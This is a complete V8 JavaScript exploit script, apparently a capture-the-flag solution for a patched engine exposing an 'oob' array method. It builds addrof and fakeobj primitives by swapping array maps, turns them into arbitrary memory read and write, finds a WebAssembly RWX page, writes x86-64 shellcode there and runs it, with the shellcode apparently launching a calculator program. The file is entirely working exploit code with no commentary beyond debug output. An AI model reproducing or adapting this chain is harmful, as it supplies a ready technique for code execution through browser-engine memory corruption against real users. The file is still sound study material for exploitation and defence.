var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);


function ftoi(val) { // typeof(val) == float
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}


function itof(val) { // typeof(val) == BigInt
  // each element of u64_buf is 32 bits long
  u64_buf[0] = Number(val & 0xffffffffn); // take the first 32 bits
  u64_buf[1] = Number(val >> 32n); // take the rest
  return f64_buf[0];
}


var temp_obj = {"A": 1};
var obj_arr = [temp_obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj_map = obj_arr.oob();
var float_map = float_arr.oob();


function addrof(target_obj) {
  obj_arr[0] = target_obj;
  obj_arr.oob(float_map);
  var addr = obj_arr[0];
  obj_arr.oob(obj_map);
  obj_arr[0] = temp_obj;
  return ftoi(addr);
}


function fakeobj(addr) { // typeof(addr) == BigInt
  float_arr[0] = itof(addr);
  float_arr.oob(obj_map);
  var fake = float_arr[0];
  float_arr.oob(float_map);
  // float_arr[0] = 1.1;
  return fake;
}


// Fakeobj will be placed on top of arb_rw_arr.
// First 8 bytes of an object will be a pointer to the map,
// so this fakeobj will be treated as a float array.
// Since the first element is pointing to Map of float.
var arb_rw_arr = [float_map, 1.2, 1.3, 1.4];

function read(addr) {
  if (addr % 2n == 0)
    addr += 1n;

  console.log("read()");

  console.log("Get fakeobj");
  // Grab fakeobj from elements of FixedDoubleArray of arb_rw_arr,
  // which is 0x20n bytes behind JSArray == addrof(arb_rw_arr).
  let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

  console.log("Overwrite elements");
  // Overwrite elements pointer of fake object
  arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

  console.log("Read value from fake object");
  let ret = ftoi(fake[0]);
  console.log("Return");
  return ret;
}


function initial_write(addr, val) {
  let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

  // Overwrite element pointer of fakeobj
  arb_rw_arr[2] = itof(BigInt(addr) - 0x10n)

  fake[0] = itof(BigInt(val));
}


function write(addr, val) {
  let buf = new ArrayBuffer(8);
  let dataview = new DataView(buf);
  let buf_addr = addrof(buf);
  initial_write(buf_addr + 0x20n, addr);
  dataview.setBigUint64(0, BigInt(val), true);
}


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

console.log("[+] Created wasm objects");
var addr_wasm_instance = addrof(wasm_instance);
console.log("[+] addr_wasm_instance = " + addr_wasm_instance.toString(16));

var addr_rwx_page = read(addr_wasm_instance - 1n + 0x88n);


console.log("[+] addr_rwx_page = " + addr_rwx_page.toString(16));

var shellcode=[0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];


function copy_words(addr, dwords) {
  let buf = new ArrayBuffer(0x100);
  let dataview = new DataView(buf);
  let buf_addr = addrof(buf);
  initial_write(buf_addr + 0x20n, addr);

  for (var i = 0; i < dwords.length; i++) {
    dataview.setUint32(i * 4, dwords[i], true);
  }
}


copy_words(addr_rwx_page, shellcode);
f();
